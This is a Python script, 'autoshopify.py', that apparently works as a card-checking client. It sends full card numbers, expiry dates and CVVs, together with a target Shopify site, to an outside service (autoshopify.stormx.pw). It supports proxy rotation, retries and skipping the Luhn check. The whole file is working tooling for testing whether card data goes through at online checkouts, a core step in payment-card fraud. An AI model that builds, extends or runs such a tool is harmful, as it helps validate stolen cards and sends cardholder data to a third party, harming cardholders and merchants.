#!/usr/bin/env python3
"""
autoshopify.py

Use as CLI:
    python3 autoshopify.py -s example-shopify.com -c "4242424242424242|12|2027|123" -p "host:port:user:pass"

Or import:
    from autoshopify import stormxcc
    resp = stormxcc("example-shopify.com", "4242424242424242|12|2027|123", proxy="host:port:user:pass")
"""

from typing import Optional, Dict, Any
import re
import time
from urllib.parse import urljoin
import requests
from requests.exceptions import RequestException, Timeout
import argparse
import sys

BASE_URL = "https://autoshopify.stormx.pw/index.php"

# ---------- Utilities ----------

def luhn_check(card_num: str) -> bool:
    digits = [int(d) for d in card_num if d.isdigit()]
    if len(digits) < 12:
        return False
    s = 0
    parity = len(digits) % 2
    for i, d in enumerate(digits):
        if i % 2 == parity:
            d *= 2
            if d > 9:
                d -= 9
        s += d
    return s % 10 == 0

def parse_cc(cc_raw: str, allow_two_digit_year: bool = False) -> Dict[str, str]:
    """
    Parse CC string 'PAN|MM|YYYY|CVV' (YYYY should be 4 digits).
    If allow_two_digit_year True, 'YY' will be expanded to '20YY' if it looks like it.
    """
    parts = cc_raw.strip().split('|')
    if len(parts) != 4:
        raise ValueError("CC must be in format PAN|MM|YYYY|CVV (quote it so shell doesn't split on |).")
    pan, mm, yyyy, cvv = [p.strip() for p in parts]

    # allow 2-digit year usage (converts e.g. 28 -> 2028)
    if allow_two_digit_year and re.fullmatch(r"\d{2}", yyyy):
        yyyy = "20" + yyyy

    if not re.fullmatch(r"\d{12,19}", pan):
        raise ValueError("Card number must be 12-19 digits.")
    if not re.fullmatch(r"\d{2}", mm) or not (1 <= int(mm) <= 12):
        raise ValueError("Expiry month must be 01-12.")
    if not re.fullmatch(r"\d{4}", yyyy):
        raise ValueError("Expiry year must be 4 digits (e.g. 2027).")
    if not re.fullmatch(r"\d{3,4}", cvv):
        raise ValueError("CVV must be 3 or 4 digits.")
    return {"pan": pan, "mm": mm, "yyyy": yyyy, "cvv": cvv}

def mask_pan(pan: str) -> str:
    if len(pan) <= 10:
        return pan[:2] + "*" * (max(0, len(pan)-4)) + pan[-2:]
    return pan[:6] + "*" * (len(pan)-10) + pan[-4:]

def build_proxy_dict(proxy_str: Optional[str]) -> Optional[Dict[str,str]]:
    if not proxy_str:
        return None
    parts = proxy_str.split(':')
    if len(parts) == 2:
        host, port = parts
        proxy_url = f"http://{host}:{port}"
    elif len(parts) == 4:
        host, port, user, pwd = parts
        proxy_url = f"http://{user}:{pwd}@{host}:{port}"
    else:
        raise ValueError("Proxy must be host:port or host:port:user:pass")
    return {"http": proxy_url, "https": proxy_url}

# ---------- Core function for importers ----------

def stormxcc(site: str,
             cc: str,
             proxy: Optional[str] = None,
             tries: int = 3,
             timeout: int = 15,
             no_luhn: bool = False,
             allow_two_digit_year: bool = True,
             delay_factor: float = 1.0) -> requests.Response:
    """
    Perform a single (with retries) request to the autoshopify endpoint.

    Args:
      site: the site string to pass (e.g. "example-shopify.com" or full URL token your API expects)
      cc: card string "PAN|MM|YYYY|CVV" (quote when used from shell)
      proxy: optional proxy "host:port" or "host:port:user:pass"
      tries: number of attempts
      timeout: seconds per request
      no_luhn: skip Luhn validation (useful for test cards that don't pass Luhn)
      allow_two_digit_year: if True, converts YY to 20YY automatically
      delay_factor: multiplier for backoff sleep between tries

    Returns:
      requests.Response object (raises exceptions on final failure)
    """
    # Validate/parse card
    cc_payload = parse_cc(cc, allow_two_digit_year=allow_two_digit_year)
    if not no_luhn:
        if not luhn_check(cc_payload["pan"]):
            raise ValueError("Card number failed Luhn check. Use no_luhn=True to bypass.")

    # build proxies
    proxies = build_proxy_dict(proxy) if proxy else None

    params = {
        "site": site,
        "cc": f"{cc_payload['pan']}|{cc_payload['mm']}|{cc_payload['yyyy']}|{cc_payload['cvv']}"
    }

    headers = {
        "User-Agent": "autoshopify-client/1.0 (+https://stormx.pw)",
        "Accept": "application/json, text/plain, */*"
    }

    last_exc = None
    for attempt in range(1, tries + 1):
        try:
            resp = requests.get(BASE_URL, params=params, headers=headers, proxies=proxies, timeout=timeout)
            # log masked info
            masked = f"{mask_pan(cc_payload['pan'])}|{cc_payload['mm']}|{cc_payload['yyyy']}|***"
            print(f"[attempt {attempt}] {resp.status_code} {resp.url}")
            print(f"  site={site} cc={masked} proxy={'present' if proxy else 'none'}")
            return resp
        except Timeout as e:
            print(f"[attempt {attempt}] Timeout after {timeout}s.")
            last_exc = e
        except RequestException as e:
            print(f"[attempt {attempt}] Request failed: {e}")
            last_exc = e
        # backoff
        if attempt < tries:
            time.sleep(delay_factor * attempt)
    # all attempts failed
    raise last_exc or RuntimeError("Request failed without exception")

# ---------- CLI runner ----------

def _cli_main(argv=None):
    parser = argparse.ArgumentParser(prog="autoshopify.py")
    parser.add_argument("-s", "--site", required=True, help="Target site value to pass to API")
    parser.add_argument("-c", "--cc", required=True, help="Card string in format PAN|MM|YYYY|CVV (quote it!)")
    parser.add_argument("-p", "--proxy", default=None, help="Optional proxy host:port or host:port:user:pass")
    parser.add_argument("--no-luhn", action="store_true", help="Skip Luhn check")
    parser.add_argument("--tries", type=int, default=3, help="Number of tries")
    parser.add_argument("--timeout", type=int, default=15, help="Timeout seconds per request")
    parser.add_argument("--allow-2d-year", action="store_true", dest="allow_2d", help="Allow two-digit year (e.g. 28 -> 2028)")
    parser.add_argument("--json", action="store_true", help="Print JSON body if response is JSON")
    args = parser.parse_args(argv)

    # If user passed a two-digit year like "03|28|323" previously, they must instead use 2028.
    # We allow automatic expansion if flag set:
    try:
        resp = stormxcc(
            site=args.site,
            cc=args.cc,
            proxy=args.proxy,
            tries=args.tries,
            timeout=args.timeout,
            no_luhn=args.no_luhn,
            allow_two_digit_year=args.allow_2d
        )
        ct = resp.headers.get("Content-Type", "")
        if args.json or "application/json" in ct:
            try:
                print("\nJSON response:")
                print(resp.json())
            except Exception:
                print(resp.text[:2000])
        else:
            print(resp.text[:2000])
    except Exception as e:
        print("Error:", e)
        sys.exit(4)

# Allow both import and execution
if __name__ == "__main__":
    _cli_main()
